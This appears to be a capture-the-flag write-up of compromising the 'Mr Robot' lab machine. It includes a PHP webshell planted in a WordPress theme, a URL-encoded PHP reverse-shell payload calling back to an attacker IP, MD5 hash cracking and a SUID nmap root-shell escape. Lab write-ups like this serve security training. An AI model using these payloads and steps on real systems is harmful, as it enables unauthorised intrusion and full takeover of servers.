Mr Robot (Rewritten)

Target IP: 10.10.48.173
Challenge Description:

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.48.173 -p- returns the result shown above. There are two TCP ports open: HTTP and HTTPs on their standard ports; however, it states SSH is closed. Time to perform an aggressive scan against these two TCP ports to identify its applications.


Running an aggressive scan using the command sudo nmap -sV -A 10.10.48.173 -p 80,443 returns the result shown above. I notice the two web applications return similar results. I will being my enumeration with the HTTP application on port 80 first, before moving to the HTTPs on port 443.


I performed a scan against the web server on port 80 using the command nikto -h http://10.10.48.173 -Tuning b and obtained the result shown above. The scan successfully identified Wordpress pages. Maybe I can perform a directory search to identify the Wordpress application? Before doing that, I wish to enumerate the web application on port 80 first.

Enumeration

Port 80: HTTP

Browsing to the web application on port 80, the webpage above was returned to me. I entered the different commands but I did not find anything useful. Viewing the source-code of the webpage did not result in anything useful either. Time to perform a directory search now and identify the Wordpress application.


While performing a directory search, I did some manual enumeration by browsing to http://10.10.48.173/wordpress and obtained the webpage shown above. Underneath the META section, I notice the Entries RSS and Comments RSS. Usually, these files could contain information. I also notice a user called user exists in this Wordpress application.


I downloaded the Entries RSS file by clicking on it, and the webpage above was returned to me. Right away, I notice the target machine is running Wordpress 4.3.1 as shown above. Is this application version vulnerable? I browsed to Log in and used default credentials such as admin:root and root:root, but I had no luck. The directory search was slow.

User-agent: *
fsocity.dic

User-agent: *
fsocity.dic
key-1-of-3.txt

When I browsed to http://10.10.48.173/robots.txt, the entries above was returned to me. Then I browsed to http://10.10.48.173/fsocity.dic and I obtained a list of passwords. This passwords list is similar to rockyou.txt which contains over fifty-thousand passwords. I made a copy of all the passwords to my computer in a file called fsociety.dic. Since the directory search was slow, I decided to enumerate the Wordpress application instead using wpscan.


One of the result from the directory search was license.txt. I browsed to this webpage and found the base64 encoded string, as shown above. To decode this base64, I ran the command echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d inside my terminal and obtained the credentials elliot:ER28-0652. I have only found one login webpage so far, that is the Wordpress.


I browsed to http://10.10.48.173/wp-admin/ and the login webpage above was returned to me. Then I entered elliot as the username, and ER28-0652 as the password.


And bingo. I managed to successfully login to the Wordpress application as shown above, as the user Elliot. And the application version seems to be 4.3.1, which I found from earlier enumeration. There are multiple attack vectors using Wordpress once I have valid credentials. One is, if the user elliot has editing privileges then I can insert a PHP webshell inside a template page of any theme. When enumerating the application, I notice this user has editing privileges. Time to own the Wordpress application by upload a webshell and obtaining a reverse shell connection now.

Exploitation

Owning the Wordpress Application & Uploading a PHP Webshell

To upload my PHP webshell, I pressed the Editor from the left-hand side of the Appearance panel underneath. Then I checked the themes I can edit and successfully identified Twenty Fourteen is editable.

<?php
    echo system($_GET['cmd']);
?>
<?php
    echo system($_GET['cmd']);
?>

Afterwards I inserted the simple PHP code shown above by replacing the 404.php file inside the Twenty Fourteen theme, as shown in the previous image. Then I pressed the Update File to make the changes.

Foothold: RCE via PHP Webshell & Reverse Shell Connection


To use my PHP webshell, I browsed to http://10.10.48.173/wp-content/themes/twentyfourteen/404.php. The nmap scan identified the target machine is running Linux. Then to perform RCE, I can use the cmd parameter name, for example, I ran the commands whoami;ls and obtained the result shown above. The full URL for this is http://10.10.48.173/wp-content/themes/twentyfourteen/404.php?cmd=whoami;ls, as shown above. Time to obtain a reverse shell now from the target machine using this PHP webshell.


I started a listener on my machine at port 8443 using the command nc -lvnp 8443. Then using the PHP webshell, I URL encoded the payload php -r '$sock=fsockopen("10.14.87.142",8443);exec("/bin/bash <&3 >&3 2>&3");' and obtained the following php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.87.142%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.

http://10.10.48.173/wp-content/themes/twentyfourteen/404.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.87.142%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
http://10.10.48.173/wp-content/themes/twentyfourteen/404.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.87.142%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Then I entered the URL above on my browser, as shown in the previous image, to start the reverse shell. And bingo. I successfully obtained a foothold on the target machine as the user daemon as shown in the previous image. Then I upgraded my session to an interactive shell using the Python command python3 -c 'import pty; pty.spawn("/bin/bash");'. Time to elevate my privileges on the machine.

Privilege Escalation

Horizontal Privilege Escalation: daemon user to robot user via Credential Hunting & Cracking

I notice there is one user called robot inside the /home directory. Inside this user's home directory, there are two files: key-2-of-3.txt and password.raw-md5 as shown above. However, I am only able to read the second file.


I executed the command cat password.raw-md5 to view the content of this file and obtained the result robot:c3fcd3d76192e4007dfb496cca67e13b, as shown above. The second part of the encoded ciphertext seems to be in MD5 format, which can be cracked easily. Using an online tool, I cracked it and obtained the string abcdefghijklmnopqrstuvwxyz. Now I obtained the credentials robot:abcdefghijklmnopqrstuvwxyz. To switch to robot user, I used the command su robot and entered the password abcdefghijklmnopqrstuvwxyz as shown above. And bingo. I successfully elevated my privileges on the target machine from the user daemon to robot horizontally.

Vertical Privilege Escalation: robot user to root user via Weak SUID Privileges Abuse on nmap

Running the command sudo -l shows this user cannot execute any commands with privileges. However, running the command find / -perm -u=s -type f 2>/dev/null shows the /usr/local/bin/nmap binary has SUID bit set. I can abuse this weak privilege set on nmap to spawn a root shell.


Spawning a root shell is simple. Firstly, I entered the command nmap --interactive to open an interactive nmap session. Then I entered the command !sh to open a root shell, as shown above. Now I have a root shell on the target machine with the highest privileges. GG.
